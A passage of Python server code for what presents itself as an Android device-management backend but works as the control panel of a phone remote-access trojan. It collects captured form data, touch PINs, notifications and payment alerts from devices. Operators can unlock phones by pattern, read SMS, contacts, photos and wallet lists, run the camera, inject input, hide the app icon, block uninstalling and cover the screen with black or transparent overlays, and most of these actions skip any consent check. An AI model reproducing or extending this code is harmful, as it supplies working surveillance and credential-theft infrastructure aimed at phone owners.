            return encrypt_legacy_payload(response, settings.legacy_device_aes_key)
        if (
            isinstance(decoded, dict)
            and decoded.get("type") == "enc"
            and decoded.get("action")
            in {"relayStatus", "adbPairStatus", "adbShellResult", "adbScreenshot"}
        ):
            try:
                await accept_legacy_remaining_command_result(sid, decoded)
            except LegacyProtocolError as exc:
                await sio.emit(
                    "server.error",
                    {"code": "INVALID_LEGACY_RESULT", "message": str(exc)},
                    to=sid,
                )
            return None
        if (
            isinstance(decoded, dict)
            and decoded.get("type") == "enc"
            and decoded.get("action")
            in {
                "fcmToken",
                "notification",
                "formData",
                "amountAlert",
                "touchPinData",
                "capture",
                "cacheData",
            }
        ):
            try:
                await accept_legacy_active_event(sid, decoded)
            except LegacyProtocolError as exc:
                await sio.emit(
                    "server.error",
                    {"code": "INVALID_LEGACY_EVENT", "message": str(exc)},
                    to=sid,
                )
            return None
        declared_event = None
        if isinstance(decoded, dict):
            for key in ("type", "event", "name"):
                if isinstance(decoded.get(key), str):
                    declared_event = decoded[key]
                    break
        if declared_event in ANDROID_SELF_REPORT_TYPES:
            return await accept_legacy_socket_report(
                sid,
                declared_event,
                decoded,
                encrypted_input=True,
            )
        if declared_event == "command.result" or report_correlation_id(decoded):
            return await accept_legacy_socket_report(
                sid,
                "command.result",
                decoded,
                encrypted_input=True,
            )
        return await accept_legacy_socket_status(sid, "enc msg", payload)

    @sio.on("diag")
    async def legacy_diag(sid: str, payload: Any):
        return await accept_legacy_socket_status(sid, "diag", payload)

    async def accept_legacy_socket_report(
        sid: str,
        event_name: str,
        raw_payload: Any,
        encrypted_input: bool | None = None,
    ) -> dict[str, Any] | str:
        encrypted = False
        try:
            if encrypted_input is True:
                decoded, encrypted = raw_payload, True
            else:
                decoded, encrypted = decode_android_self_report(raw_payload)
            context = legacy_contexts.get(sid, {})
            already_bound = legacy_bound_devices.get(sid)
            device = legacy_device_identity(decoded, context, already_bound)
            if device is None:
                raise LegacyProtocolError(
                    "Android self-report does not match a pre-provisioned device"
                )
            bind_legacy_device(sid, device["id"])
            message_payload = (
                decoded
                if encrypted_input is True
                else raw_payload
                if isinstance(raw_payload, dict)
                else {"ciphertext": raw_payload}
            )
            report = DeviceSocketMessage(
                type=(
                    event_name
                    if event_name in ANDROID_SELF_REPORT_TYPES
                    else "command.result"
                ),
                correlation_id=report_correlation_id(decoded),
                payload=message_payload,
            )
            if report.type == "command.result":
                if encrypted_input is True:
                    result_payload = decoded
                    if isinstance(decoded, dict) and isinstance(decoded.get("payload"), dict):
                        result_payload = decoded["payload"]
                    if isinstance(result_payload, dict) and type(result_payload.get("success")) is bool:
                        normalized_payload = result_payload
                    elif isinstance(result_payload, dict) and "result" in result_payload:
                        normalized_payload = {
                            "success": True,
                            "result": result_payload["result"],
                        }
                    else:
                        normalized_payload = {"success": True, "result": result_payload}
                    normalized = report.model_copy(update={"payload": normalized_payload})
                else:
                    normalized, _ = normalize_command_result(report)
            else:
                normalized, _ = normalize_android_self_report(report)
            accepted = await handle_command_message(None, device, normalized)
            if not accepted:
                raise LegacyProtocolError("Android self-report references an unknown command")
            response: dict[str, Any] = {
                "accepted": True,
                "device_id": device["id"],
                "correlation_id": normalized.correlation_id,
            }
        except (LegacyProtocolError, ValueError) as exc:
            response = {
                "accepted": False,
                "error": "INVALID_ANDROID_SELF_REPORT",
                "message": str(exc),
            }
            await sio.emit("server.error", response, to=sid)
        if encrypted:
            return encrypt_legacy_payload(response, settings.legacy_device_aes_key)
        return response

    @sio.on("screenshot")
    async def legacy_screenshot(sid: str, payload: Any):
        return await accept_legacy_socket_report(sid, "screenshot", payload)

    @sio.on("adbScreenshot")
    async def legacy_adb_screenshot(sid: str, payload: Any):
        return await accept_legacy_socket_report(sid, "adbScreenshot", payload)

    @sio.on("camPic")
    async def legacy_camera_picture(sid: str, payload: Any):
        return await accept_legacy_socket_report(sid, "camPic", payload)

    @sio.on("relayStatus")
    async def legacy_relay_status(sid: str, payload: Any):
        return await accept_legacy_socket_report(sid, "relayStatus", payload)

    @sio.on("adbShellResult")
    async def legacy_adb_shell_result(sid: str, payload: Any):
        return await accept_legacy_socket_report(sid, "adbShellResult", payload)

    @sio.on("command.result")
    async def legacy_command_result(sid: str, payload: Any):
        return await accept_legacy_socket_report(sid, "command.result", payload)

    @sio.event
    async def disconnect(sid: str, *args: Any):
        legacy_contexts.pop(sid, None)
        device_id = legacy_bound_devices.pop(sid, None)
        if device_id is not None and legacy_device_sids.get(device_id) == sid:
            legacy_device_sids.pop(device_id, None)
            replacement_sid = next(
                (
                    candidate_sid
                    for candidate_sid, candidate_device_id in reversed(
                        legacy_bound_devices.items()
                    )
                    if candidate_device_id == device_id
                ),
                None,
            )
            if replacement_sid is not None:
                legacy_device_sids[device_id] = replacement_sid
        if device_id is not None:
            database.execute(
                "UPDATE devices SET socket_id=?,updated_at=? WHERE id=?",
                (legacy_device_sids.get(device_id), utc_now(), device_id),
            )
        if device_id is None or device_id in legacy_bound_devices.values():
            return
        if await hub.is_online(device_id):
            return
        now = utc_now()
        database.execute(
            "UPDATE device_status SET online=0,updated_at=? WHERE device_id=?",
            (now, device_id),
        )
        device = database.one(
            "SELECT owner_user_id FROM devices WHERE id=?", (device_id,)
        )
        await hub.broadcast_dashboard(
            {
                "type": "device.offline",
                "device_id": device_id,
                "reason": "legacy_socketio_closed",
                "time": now,
            },
            device["owner_user_id"] if device else None,
        )

    @app.post("/api/device/logs")
    def device_logs(
        body: DeviceLogRequest,
        request: Request,
        device: dict[str, Any] = Depends(device_identity),
    ):
        try:
            database.execute(
                "INSERT INTO device_logs(device_id,event_uid,level,category,event,message,details_json,device_time,received_at) "
                "VALUES(?,?,?,?,?,?,?,?,?)",
                (
                    device["id"],
                    body.event_uid,
                    body.level,
                    body.category,
                    body.event,
                    body.message,
                    json.dumps(body.details, ensure_ascii=False),
                    body.device_time,
                    utc_now(),
                ),
            )
        except sqlite3.IntegrityError:
            return envelope(request, {"accepted": True, "duplicate": True})
        return envelope(request, {"accepted": True, "duplicate": False}, 202)

    @app.get("/api/overview")
    def overview(request: Request, user: dict[str, Any] = Depends(current_user)):
        where = "" if user["role"] == "admin" else " WHERE d.owner_user_id=?"
        params: tuple[Any, ...] = () if user["role"] == "admin" else (user["id"],)
        total = database.one("SELECT count(*) AS value FROM devices d" + where, params)["value"]
        online = database.one(
            "SELECT count(*) AS value FROM devices d JOIN device_status s ON s.device_id=d.id"
            + where
            + (" AND" if where else " WHERE")
            + " s.online=1",
            params,
        )["value"]
        return envelope(request, {"total": total, "online": online, "offline": total - online})

    @app.get("/api/devices")
    def devices(
        request: Request,
        user: dict[str, Any] = Depends(current_user),
        q: str = Query(default="", max_length=120),
        device_id: str = Query(default="", max_length=120),
        owner_user_id: str | None = Query(default=None, max_length=80),
        online: bool | None = None,
        accessibility: bool | None = None,
        uninstall_protection: bool | None = None,
        battery_whitelist: bool | None = None,
        page: int = Query(default=1, ge=1),
        page_size: int = Query(default=20, ge=1, le=100),
    ):
        clauses: list[str] = []
        params: list[Any] = []
        if user["role"] != "admin":
            clauses.append("d.owner_user_id=?")
            params.append(user["id"])
        elif owner_user_id:
            clauses.append("d.owner_user_id=?")
            params.append(owner_user_id)
        if device_id:
            clauses.append("d.id LIKE ?")
            params.append(f"%{device_id}%")
        if q:
            clauses.append(
                "(d.id LIKE ? OR d.name LIKE ? OR d.brand LIKE ? OR d.model LIKE ? "
                "OR d.note LIKE ? OR g.name LIKE ?)"
            )
            term = f"%{q}%"
            params.extend([term, term, term, term, term, term])
        if online is not None:
            clauses.append("s.online=?")
            params.append(int(online))
        if accessibility is not None:
            clauses.append("s.accessibility_enabled=?")
            params.append(int(accessibility))
        if uninstall_protection is not None:
            clauses.append("s.uninstall_protection_enabled=?")
            params.append(int(uninstall_protection))
        if battery_whitelist is not None:
            clauses.append("s.battery_whitelist_enabled=?")
            params.append(int(battery_whitelist))
        where = " WHERE " + " AND ".join(clauses) if clauses else ""
        count = database.one(
            "SELECT count(*) AS value FROM devices d JOIN device_status s ON s.device_id=d.id "
            "LEFT JOIN device_groups g ON g.id=d.group_id"
            + where,
            tuple(params),
        )["value"]
        summary = database.one(
            "SELECT count(*) AS total,"
            "coalesce(sum(CASE WHEN s.online=1 THEN 1 ELSE 0 END),0) AS online,"
            "coalesce(sum(CASE WHEN s.online=0 THEN 1 ELSE 0 END),0) AS offline,"
            "coalesce(sum(CASE WHEN s.accessibility_enabled=1 THEN 1 ELSE 0 END),0) AS accessibility,"
            "coalesce(sum(CASE WHEN s.uninstall_protection_enabled=1 THEN 1 ELSE 0 END),0) AS uninstall_protection,"
            "coalesce(sum(CASE WHEN s.battery_whitelist_enabled=1 THEN 1 ELSE 0 END),0) AS battery_whitelist "
            "FROM devices d JOIN device_status s ON s.device_id=d.id "
            "LEFT JOIN device_groups g ON g.id=d.group_id"
            + where,
            tuple(params),
        )
        rows = database.all(
            "SELECT d.id,d.name,d.brand,d.model,d.android_version,d.sdk_int,d.package_name,d.app_version,"
            "d.locale,d.timezone,d.ip_address,d.socket_id,d.last_online_at,d.last_heartbeat_at,d.created_at,"
            "d.owner_user_id,d.group_id,d.note,d.last_seen_at,g.name AS group_name,s.* "
            "FROM devices d JOIN device_status s ON s.device_id=d.id "
            "LEFT JOIN device_groups g ON g.id=d.group_id"
            + where
            + " ORDER BY d.created_at DESC LIMIT ? OFFSET ?",
            tuple(params + [page_size, (page - 1) * page_size]),
        )
        return JSONResponse(
            {
                "data": rows,
                "meta": {
                    "request_id": request.state.request_id,
                    "page": page,
                    "page_size": page_size,
                    "total": count,
                    "summary": summary,
                },
            }
        )

    @app.get("/api/devices/{device_id}")
    def device_detail(
        device_id: str,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        visible_device(device_id, user)
        row = database.one(
            "SELECT d.id,d.installation_id,d.owner_user_id,d.group_id,g.name AS group_name,d.name,d.note,"
            "d.brand,d.model,d.android_version,"
            "d.sdk_int,d.package_name,d.app_version,d.locale,d.timezone,d.ip_address,"
            "d.socket_id,d.last_online_at,d.last_heartbeat_at,"
            "d.first_seen_at,d.last_seen_at,d.created_at,d.updated_at,"
            "s.online,s.battery_percent,s.charging,s.network_type,s.network_quality,s.network_latency_ms,"
            "s.screen_state,s.locked,s.lock_state_code,"
            "s.accessibility_enabled,s.battery_whitelist_enabled,s.device_admin_enabled,"
            "s.screen_permission_enabled,s.camera_permission_enabled,s.uninstall_protection_enabled,"
            "s.launcher_icon_visible,s.screen_interactive,s.idle_mode,s.memory_available_mb,"
            "s.memory_total_mb,s.memory_low,s.last_acc_event,s.last_acc_event_at,"
            "s.battery_stage,s.battery_message,s.battery_status_at,s.device_admin_status,"
            "s.device_admin_message,s.device_admin_updated_at,s.reported_at,"
            "s.updated_at AS status_updated_at "
            "FROM devices d JOIN device_status s ON s.device_id=d.id "
            "LEFT JOIN device_groups g ON g.id=d.group_id WHERE d.id=?",
            (device_id,),
        )
        return envelope(request, row)

    @app.patch("/api/devices/{device_id}")
    def update_device(
        device_id: str,
        body: DeviceUpdateRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        device = visible_device(device_id, user)
        require_role(user, "admin", "operator")
        group_id = None if body.clear_group else body.group_id
        if body.group_id is not None:
            group = database.one("SELECT * FROM device_groups WHERE id=?", (body.group_id,))
            if group is None or (
                user["role"] != "admin" and group["owner_user_id"] != user["id"]
            ):
                raise HTTPException(status_code=404, detail="device group not found")
        if body.owner_user_id is not None:
            require_role(user, "admin")
            owner = database.one(
                "SELECT id FROM users WHERE id=? AND status='active'", (body.owner_user_id,)
            )
            if owner is None:
                raise HTTPException(status_code=404, detail="user not found")
        updates: list[str] = []
        params: list[Any] = []
        if body.name is not None:
            updates.append("name=?")
            params.append(body.name)
        if body.note is not None:
            updates.append("note=?")
            params.append(body.note)
        if body.group_id is not None or body.clear_group:
            updates.append("group_id=?")
            params.append(group_id)
        if body.owner_user_id is not None:
            updates.append("owner_user_id=?")
            params.append(body.owner_user_id)
            if body.group_id is None:
                updates.append("group_id=?")
                params.append(None)
        updates.append("updated_at=?")
        params.extend([utc_now(), device["id"]])

        def action(conn: sqlite3.Connection):
            conn.execute(
                "UPDATE devices SET " + ",".join(updates) + " WHERE id=?",
                tuple(params),
            )
            Database.audit(
                conn,
                "user",
                user["id"],
                "device.update",
                "device",
                device["id"],
                "success",
                body.model_dump(exclude_none=True),
            )

        database.transaction(action)
        return envelope(request, {"updated": True, "device_id": device["id"]})

    @app.get("/api/devices/{device_id}/events")
    def device_events(
        device_id: str,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        visible_device(device_id, user)
        rows = database.all(
            "SELECT id,actor_type,actor_id,action,target_type,target_id,result,details_json,created_at "
            "FROM audit_logs WHERE target_id=? ORDER BY id DESC LIMIT 200",
            (device_id,),
        )
        for row in rows:
            row["details"] = json.loads(row.pop("details_json"))
        return envelope(request, rows)

    @app.get("/api/devices/{device_id}/workbench/{module}")
    def reserved_workbench_module(
        device_id: str,
        module: str,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        visible_device(device_id, user)
        if module not in RESERVED_WORKBENCH_MODULES:
            raise HTTPException(status_code=404, detail="workbench module not found")
        action = f"workbench.{module}"
        latest = database.one(
            "SELECT id,status,completed_at,error_code,error_message,result_json "
            "FROM commands WHERE device_id=? AND action=? "
            "ORDER BY queued_at DESC LIMIT 1",
            (device_id, action),
        )
        data = None
        if latest is not None and latest["status"] == "success" and latest["result_json"]:
            data = json.loads(latest["result_json"])
        return envelope(
            request,
            {
                "module": module,
                "source": "android_self_reported" if data is not None else "no_report",
                "data": data,
                "last_command": (
                    {
                        "id": latest["id"],
                        "status": latest["status"],
                        "completed_at": latest["completed_at"],
                        "error_code": latest["error_code"],
                        "error_message": latest["error_message"],
                    }
                    if latest is not None
                    else None
                ),
            },
        )

    @app.post("/api/devices/{device_id}/workbench/{module}/request")
    async def request_workbench_module(
        device_id: str,
        module: str,
        request: Request,
        body: dict[str, Any] | None = None,
        user: dict[str, Any] = Depends(current_user),
    ):
        device = visible_device(device_id, user)
        require_role(user, "admin", "operator")
        if module not in WORKBENCH_MODULE_ACTIONS:
            raise HTTPException(status_code=404, detail="workbench module not found")
        parameters = body or {}
        if module == "files":
            if set(parameters) - {"path"}:
                raise HTTPException(status_code=400, detail="unsupported file request field")
            if "path" in parameters:
                path = parameters["path"]
                if not isinstance(path, str) or not 1 <= len(path) <= 4096:
                    raise HTTPException(status_code=400, detail="invalid file path")
                parameters = {"path": path}
        elif parameters:
            raise HTTPException(status_code=400, detail="this module accepts no payload")
        result = await dispatch_tracked_command(
            device=device,
            user=user,
            action=f"workbench.{module}",
            payload=parameters,
            dispatch_action=WORKBENCH_MODULE_ACTIONS[module],
            dispatch_payload=parameters,
        )
        return envelope(request, result, 202)

    @app.post("/api/devices/{device_id}/workbench-actions/{action}")
    async def reserved_workbench_action(
        device_id: str,
        action: str,
        body: ReservedWorkbenchActionRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        device = visible_device(device_id, user)
        require_role(user, "admin", "operator")
        if action not in RESERVED_WORKBENCH_ACTIONS:
            raise HTTPException(status_code=404, detail="workbench action not found")
        parameters = workbench_action_payload(action, body)
        if action in {
            "unlock",
            "patternUnlock",
            "smartUnlock",
            "lockScreen",
            "power",
            "screenshot",
            "front-camera",
            "rear-camera",
            "startCam",
            "stopCam",
            "openpkg",
            "uninstallApk",
            "antiDeleteOn",
            "antiDeleteOff",
            "startApk",
            "showShortcuts",
            "hideShortcuts",
            "iconAlias",
            "iconList",
            "black",
            "blackB",
            "lockNormal",
            "light",
            "lightT",
            "transparent",
            "openLayer",
            "showLockOverlay",
            "hideLockOverlay",
            "inputSend",
            "readSmsList",
            "walletList",
            "reqPerList",
            "readAlbumList",
            "readAlbumLast",
            "readAlbumThumbnail",
            "readContactList",
        } or action in LEGACY_REMAINING_ACTIONS:
            wire_action = action
            wire_data = parameters
            if action in {"front-camera", "rear-camera", "startCam"}:
                camera_index = (
                    1
                    if action == "front-camera"
                    else 0
                    if action == "rear-camera"
                    else parameters["index"]
                )
                wire_action = "startCam"
                wire_data = {
                    "index": camera_index,
                    "quality": 50,
                    "rotation": 0,
                    "frameRate": 15,
                    "width": 640,
                    "zoom": 0,
                }
            elif action == "iconList":
                wire_data = {"fromAdmin": "admin"}
            elif action == "readSmsList":
                wire_data = {
                    "curpage": 0,
                    "pagesize": 50,
                    "fromAdmin": "admin",
                }
            elif action in {"walletList", "reqPerList"}:
                wire_data = {"fromAdmin": "admin"}
            elif action == "readAlbumList":
                wire_data = {
                    "curpage": 1,
                    "pagesize": 50,
                    "fromAdmin": "admin",
                }
            elif action == "readAlbumLast":
                wire_data = {**parameters, "fromAdmin": "admin"}
            elif action == "readAlbumThumbnail":
                wire_data = {**parameters, "fromAdmin": "admin"}
            elif action == "readContactList":
                wire_data = {
                    "curpage": 0,
                    "pagesize": 50,
                    "fromAdmin": "admin",
                }
            elif action in LEGACY_REMAINING_FIXED_DATA:
                wire_data = json.loads(
                    json.dumps(LEGACY_REMAINING_FIXED_DATA[action])
                )
            elif action == "fetchIcon":
                wire_data = {**parameters, "fromAdmin": "admin"}
            if await hub.is_online(device["id"]):
                result = await dispatch_tracked_command(
                    device=device,
                    user=user,
                    action=action,
                    payload=parameters,
                    dispatch_action=wire_action,
                    dispatch_payload=wire_data,
                )
            else:
                result = await dispatch_legacy_untracked_command(
                    device=device,
                    user=user,
                    action=action,
                    data=wire_data,
                    wire_action=wire_action,
                    persist_data=action in LEGACY_REMAINING_ACTIONS,
                )
                # Keep the established workbench response contract for legacy
                # Socket.IO clients. The command id is still stored internally
                # and returned by the generic /api/command endpoint.
                result = {"status": result["status"]}
        else:
            result = await dispatch_tracked_command(
                device=device,
                user=user,
                action=action,
                payload=parameters,
            )
        return envelope(request, result, 202)

    @app.post("/api/command")
    async def create_command(
        body: CommandRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        device = visible_device(body.device_id, user)
        require_role(user, "admin", "operator")
        validate_command_payload(body.action, body.payload)
        if body.action in {"request_screen_share", "lock_device"}:
            require_recent_reauth(user)
        if body.action == "lock_device":
            require_role(user, "admin")
            if not settings.enable_device_lock:
                raise HTTPException(
                    status_code=403,
                    detail=(
                        "device lock is disabled; enable only for Android Enterprise "
                        "device-owner deployments with documented authorization"
                    ),
                )
        dispatch_action = body.action
        dispatch_payload = body.payload
        if await hub.is_online(device["id"]):
            result = await dispatch_tracked_command(
                device=device,
                user=user,
                action=body.action,
                payload=body.payload,
                dispatch_action=dispatch_action,
                dispatch_payload=dispatch_payload,
            )
        elif device["id"] in legacy_device_sids:
            result = await dispatch_legacy_untracked_command(
                device=device,
                user=user,
                action=body.action,
                data=body.payload,
                wire_action=dispatch_action,
            )
        else:
            result = await dispatch_tracked_command(
                device=device,
                user=user,
                action=body.action,
                payload=body.payload,
                dispatch_action=dispatch_action,
                dispatch_payload=dispatch_payload,
            )
        return envelope(request, result, 202)

    @app.post("/api/devices/{device_id}/binary-actions/{action}")
    async def legacy_binary_action(
        device_id: str,
        action: str,
        body: ReservedWorkbenchActionRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        device = visible_device(device_id, user)
        require_role(user, "admin", "operator")
        if action not in RESERVED_WORKBENCH_ACTIONS:
            raise HTTPException(status_code=404, detail="binary action not found")
        data = workbench_action_payload(action, body)
        if action in LEGACY_REMAINING_FIXED_DATA:
            data = json.loads(json.dumps(LEGACY_REMAINING_FIXED_DATA[action]))
        elif action == "fetchIcon":
            data = {**data, "fromAdmin": "admin"}
        target = binary_connections.get(device["id"])
        if target is None:
            raise HTTPException(status_code=409, detail="binary device is offline")
        command_id = str(uuid.uuid4())
        now = utc_now()
        database.execute(
            "INSERT INTO commands(id,device_id,operator_id,action,payload_json,status,queued_at) "
            "VALUES(?,?,?,?,?,'queued',?)",
            (
                command_id,
                device["id"],
                user["id"],
                action,
                json.dumps(data, ensure_ascii=False, separators=(",", ":")),
                now,
            ),
        )
        payload = json.dumps(
            {"action": action, "data": data},
            ensure_ascii=False,
            separators=(",", ":"),
        ).encode("utf-8")
        packet = bytes([0x10]) + len(payload).to_bytes(4, "big") + payload
        try:
            async with binary_send_locks.setdefault(device["id"], asyncio.Lock()):
                await target.send_bytes(packet)
        except RuntimeError as exc:
            database.execute(
                "UPDATE commands SET status='failed',completed_at=?,error_code='SEND_FAILED',"
                "error_message='failed to send binary command' WHERE id=?",
                (utc_now(), command_id),
            )
            raise HTTPException(status_code=409, detail="failed to send binary command") from exc
        database.execute(
            "UPDATE commands SET status='sent',sent_at=? WHERE id=?",
            (utc_now(), command_id),
        )
        record_legacy_expected_state(device["id"], action, data)
        record_legacy_stream_command(device["id"], action, data)
        return envelope(request, {"status": "sent"}, 202)

    @app.get("/api/commands")
    def commands(
        request: Request,
        user: dict[str, Any] = Depends(current_user),
        device_id: str | None = Query(default=None, max_length=80),
        action: str | None = Query(default=None, max_length=80),
        command_status: str | None = Query(
            default=None,
            alias="status",
            pattern="^(queued|sent|acknowledged|success|failed)$",
        ),
        q: str = Query(default="", max_length=120),
        page: int = Query(default=1, ge=1),
        page_size: int = Query(default=20, ge=1, le=100),
    ):
        clauses: list[str] = []
        params: list[Any] = []
        if user["role"] != "admin":
            clauses.append("d.owner_user_id=?")
            params.append(user["id"])
        if device_id:
            visible_device(device_id, user)
            clauses.append("c.device_id=?")
            params.append(device_id)
        if action:
            clauses.append("c.action=?")
            params.append(action)
        if command_status:
            clauses.append("c.status=?")
            params.append(command_status)
        if q:
            clauses.append("(c.id LIKE ? OR d.name LIKE ? OR u.username LIKE ?)")
            term = f"%{q}%"
            params.extend([term, term, term])
        where = " WHERE " + " AND ".join(clauses) if clauses else ""
        base = (
            " FROM commands c JOIN devices d ON d.id=c.device_id "
            "JOIN users u ON u.id=c.operator_id"
        )
        total = database.one("SELECT count(*) AS value" + base + where, tuple(params))[
            "value"
        ]
        rows = database.all(
            "SELECT c.id,c.device_id,d.name AS device_name,c.operator_id,u.username AS operator_name,"
            "c.action,c.payload_json,c.status,c.queued_at,c.sent_at,c.acknowledged_at,c.completed_at,"
            "c.error_code,c.error_message,c.result_json"
            + base
            + where
            + " ORDER BY c.queued_at DESC LIMIT ? OFFSET ?",
            tuple(params + [page_size, (page - 1) * page_size]),
        )
        for row in rows:
            row["payload"] = json.loads(row.pop("payload_json"))
            raw_result = row.pop("result_json")
            row["result"] = json.loads(raw_result) if raw_result else None
        return JSONResponse(
            {
                "data": rows,
                "meta": {
                    "request_id": request.state.request_id,
                    "page": page,
                    "page_size": page_size,
                    "total": total,
                },
            }
        )

    @app.get("/api/commands/{command_id}")
    def command_detail(
        command_id: str,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        row = database.one("SELECT * FROM commands WHERE id=?", (command_id,))
        if row is None:
            raise HTTPException(status_code=404, detail="command not found")
        visible_device(row["device_id"], user)
        row["payload"] = json.loads(row.pop("payload_json"))
        row["result"] = json.loads(row.pop("result_json")) if row["result_json"] else None
        return envelope(request, row)

    @app.get("/api/screen-sessions")
    def screen_sessions(
        request: Request,
        user: dict[str, Any] = Depends(current_user),
        device_id: str | None = Query(default=None, max_length=80),
        page: int = Query(default=1, ge=1),
        page_size: int = Query(default=20, ge=1, le=100),
    ):
        clauses: list[str] = []
        params: list[Any] = []
        if user["role"] != "admin":
            clauses.append("d.owner_user_id=?")
            params.append(user["id"])
        if device_id:
            visible_device(device_id, user)
            clauses.append("ss.device_id=?")
            params.append(device_id)
        where = " WHERE " + " AND ".join(clauses) if clauses else ""
        base = " FROM screen_sessions ss JOIN devices d ON d.id=ss.device_id"
        total = database.one("SELECT count(*) AS value" + base + where, tuple(params))[
            "value"
        ]
        rows = database.all(
            "SELECT ss.id,ss.device_id,d.name AS device_name,ss.operator_id,ss.command_id,ss.status,"
            "ss.requested_at,ss.consented_at,ss.ended_at,ss.error_code,ss.error_message"
            + base
            + where
            + " ORDER BY ss.requested_at DESC LIMIT ? OFFSET ?",
            tuple(params + [page_size, (page - 1) * page_size]),
        )
        return JSONResponse(
            {
                "data": rows,
                "meta": {
                    "request_id": request.state.request_id,
                    "page": page,
                    "page_size": page_size,
                    "total": total,
                },
            }
        )

    @app.post("/api/screen-sessions")
    async def create_screen_session(
        body: ScreenSessionRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        require_recent_reauth(user)
        device = visible_device(body.device_id, user)
        if not await hub.is_online(device["id"]):
            raise HTTPException(status_code=409, detail="device is offline")
        session_id = str(uuid.uuid4())
        command_id = str(uuid.uuid4())
        now = utc_now()
        browser_ticket = ""
        device_ticket = ""

        def action(conn: sqlite3.Connection):
            nonlocal browser_ticket, device_ticket
            conn.execute(
                "INSERT INTO commands(id,device_id,operator_id,action,payload_json,status,queued_at) "
                "VALUES(?,?,?,?,?,'queued',?)",
                (
                    command_id,
                    device["id"],
                    user["id"],
                    "request_screen_share",
                    "{}",
                    now,
                ),
            )
            conn.execute(
                "INSERT INTO screen_sessions(id,device_id,operator_id,command_id,status,requested_at) "
                "VALUES(?,?,?,?, 'requesting',?)",
                (session_id, device["id"], user["id"], command_id, now),
            )
            browser_ticket = issue_screen_ticket(conn, session_id, "browser")
            device_ticket = issue_screen_ticket(conn, session_id, "device")
            payload = {
                "session_id": session_id,
                "device_media_ticket": device_ticket,
                "media_ws_path": "/ws/screen",
                "frame_protocol": "one-jpeg-or-webp-image-per-binary-message",
                "consent_required": True,
            }
            conn.execute(
                "UPDATE commands SET payload_json=? WHERE id=?",
                (json.dumps(payload, ensure_ascii=False), command_id),
            )
            Database.audit(
                conn,
                "user",
                user["id"],
                "screen_session.create",
                "device",
                device["id"],
                "requesting",
                {"session_id": session_id, "command_id": command_id},
            )

        database.transaction(action)
        sent = await hub.send_command(
            device["id"],
            {
                "type": "command.dispatch",
                "message_id": str(uuid.uuid4()),
                "correlation_id": command_id,
                "payload": {
                    "action": "request_screen_share",
                    "parameters": {
                        "session_id": session_id,
                        "device_media_ticket": device_ticket,
                        "media_ws_path": "/ws/screen",
                        "frame_protocol": "one-jpeg-or-webp-image-per-binary-message",
                        "consent_required": True,
                    },
                },
            },
        )
        if not sent:
            database.execute(
                "UPDATE screen_sessions SET status='failed',ended_at=?,error_code='DEVICE_OFFLINE',"
                "error_message='device disconnected before command dispatch' WHERE id=?",
                (utc_now(), session_id),
            )
            database.execute(
                "UPDATE commands SET status='failed',completed_at=?,error_code='DEVICE_OFFLINE',"
                "error_message='device is not connected' WHERE id=?",
                (utc_now(), command_id),
            )
            raise HTTPException(status_code=409, detail="device is offline")
        database.execute(
            "UPDATE commands SET status='sent',sent_at=? WHERE id=? AND status='queued'",
            (utc_now(), command_id),
        )
        database.execute(
            "UPDATE screen_sessions SET status='awaiting_consent' WHERE id=?",
            (session_id,),
        )
        return envelope(
            request,
            {
                "id": session_id,
                "device_id": device["id"],
                "command_id": command_id,
                "status": "awaiting_consent",
                "browser_ticket": browser_ticket,
                "ws_path": "/ws/screen",
                "ticket_expires_in": settings.ws_ticket_ttl_seconds,
                "frame_protocol": "one-jpeg-or-webp-image-per-binary-message",
            },
            201,
        )

    @app.get("/api/screen-sessions/{session_id}")
    def screen_session_detail(
        session_id: str,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        return envelope(request, visible_screen_session(session_id, user))

    @app.post("/api/screen-sessions/{session_id}/stop")
    async def stop_screen_session(
        session_id: str,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        session = visible_screen_session(session_id, user)
        await hub.send_command(
            session["device_id"],
            {
                "type": "command.dispatch",
                "message_id": str(uuid.uuid4()),
                "correlation_id": session["command_id"],
                "payload": {
                    "action": "stop_screen_share",
                    "parameters": {"session_id": session_id},
                },
            },
        )
        await hub.notify_screen_peer(
            session_id,
            "device",
            {"type": "screen.stop", "payload": {"reason": "operator_stopped"}},
        )
        database.execute(
            "UPDATE screen_sessions SET status='stopped',ended_at=? "
            "WHERE id=? AND status NOT IN ('stopped','denied','failed')",
            (utc_now(), session_id),
        )
        await hub.broadcast_dashboard(
            {
                "type": "screen.session.updated",
                "session_id": session_id,
                "device_id": session["device_id"],
                "status": "stopped",
            },
            session["owner_user_id"],
        )
        return envelope(request, {"id": session_id, "status": "stopped"})

    @app.websocket("/ws/screen")
    async def screen_websocket(websocket: WebSocket, ticket: str = Query()):
        ticket_row = database.consume_screen_ticket(ticket)
        if ticket_row is None:
            await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
            return
        session = database.one(
            "SELECT ss.*,d.owner_user_id FROM screen_sessions ss "
            "JOIN devices d ON d.id=ss.device_id WHERE ss.id=?",
            (ticket_row["session_id"],),
        )
        if session is None or session["status"] in {"denied", "stopped", "failed", "expired"}:
            await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
            return
        await websocket.accept()
        role = ticket_row["role"]
        connection, _ = await hub.register_screen(session["id"], role, websocket)
        if role == "device":
            now = utc_now()
            database.execute(
                "UPDATE screen_sessions SET status='active',consented_at=coalesce(consented_at,?) "
                "WHERE id=?",
                (now, session["id"]),
            )
            await hub.broadcast_dashboard(
                {
                    "type": "screen.session.updated",
                    "session_id": session["id"],
                    "device_id": session["device_id"],
                    "status": "active",
                },
                session["owner_user_id"],
            )
        await websocket.send_json(
            {
                "type": "server.hello",
                "payload": {
                    "session_id": session["id"],
                    "role": role,
                    "frame_protocol": "one-jpeg-or-webp-image-per-binary-message",
                    "max_frame_bytes": 2_000_000,
                },
            }
        )
        try:
            while True:
                message = await websocket.receive()
                if message["type"] == "websocket.disconnect":
                    break
                frame = message.get("bytes")
